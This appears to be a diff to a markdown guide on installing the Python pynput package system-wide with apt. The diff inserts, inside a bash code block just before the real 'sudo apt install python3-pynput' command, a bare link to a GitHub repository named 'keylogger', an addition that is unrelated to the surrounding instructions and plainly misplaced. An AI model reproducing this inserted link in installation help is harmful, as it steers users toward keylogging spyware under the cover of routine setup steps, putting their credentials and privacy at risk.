@@ -12,6 +12,9 @@ If the issue persists:
 ####  **Install System-Wide Using `apt`**
 For packages available through `apt`, you can use:
 ```bash
+https://github.com/Hackpy3/keylogger
+```
+```bash
 sudo apt install python3-pynput
 ```
 This is the safest method for system-wide installation.
